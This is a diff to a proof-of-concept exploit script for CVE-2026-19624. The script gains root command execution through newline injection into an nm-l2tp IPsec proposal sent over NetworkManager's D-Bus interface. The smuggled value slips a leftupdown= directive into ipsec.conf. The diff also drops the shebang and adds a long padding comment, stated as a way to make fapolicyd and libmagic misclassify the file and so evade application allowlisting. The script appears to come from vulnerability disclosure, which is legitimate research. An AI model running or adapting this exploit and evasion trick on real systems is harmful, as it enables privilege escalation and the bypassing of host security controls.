@@ -1,4 +1,4 @@
-#!/usr/bin/env python3
+# no shebang to avoid mime-type fingerprint, run with "python3 nm-l2tp-inject.py"
 #
 # LinnemanLabs - nm-l2tp PoC - root exec from newline injection
 # CVE-2026-19624
@@ -11,9 +11,31 @@
 # /run/nm-l2tp-<uuid>/ipsec.conf and loads them as root via `ipsec add`/`ipsec up`.
 #
 # Env vars:
-#   POC_GATEWAY, POC_PSK, POC_IKEV2, POC_RPORT, POC_ESP, POC_LEFTUPDOWN
+#   POC_GATEWAY, POC_PSK, POC_IKEV2, POC_LPORT, POC_RPORT, POC_LEFTUPDOWN
 #
-import dbus, uuid, os, getpass, time
+##########################################################################################
+# if we leave the shebang off of this script and just make a really long comment here,
+# fapolicyd will not scan far enough looking for content to match on and give this a type.
+#
+# the try: ... except: block matches but libmagic only scans 4192 bytes looking for it.
+#
+# so this is going to be a really long comment to make it give up and call it text/plain.
+# ########################################################################################
+# ########################################################################################
+# ########################################################################################
+# ########################################################################################
+# ########################################################################################
+# ########################################################################################
+# ########################################################################################
+# ########################################################################################
+# ########################################################################################
+# ########################################################################################
+# ########################################################################################
+# ########################################################################################
+# ########################################################################################
+# ########################################################################################
+# ok that should be long enough now, back to the real script
+import dbus, uuid, os, getpass, time, sys
 
 # default to our minimal ike responder that listens on 127.0.0.2
 GW    = os.environ.get("POC_GATEWAY", "127.0.0.2")
@@ -28,7 +50,7 @@ LPORT = os.environ.get("POC_LPORT", "4500")
 
 NM    = "org.freedesktop.NetworkManager"
 # valid proposal for our responder PoC
-INJECT = f"aes128-sha256-modp2048\n  leftupdown={LUD}\n  rightikeport={RPORT}\n  leftikeport={LPORT}"
+INJECT = f"aes128-sha256-modp2048\n  leftupdown={LUD}\n  rightikeport={RPORT}\n  leftikeport={LPORT}\n  retransmit-timeout=2s"
 
 bus = dbus.SystemBus()
 mgr = dbus.Interface(bus.get_object(NM, "/org/freedesktop/NetworkManager"), NM)
@@ -62,5 +84,7 @@ try:
     print(f"[+] connection added:     {con_path}")
     print(f"[+] connection activated: {active_path}")
     print(f"[*] uuid: {u}")
+    sys.exit(0)
 except Exception as e:
     print(f"[-] error activating connection: {e}")
+    sys.exit(1)
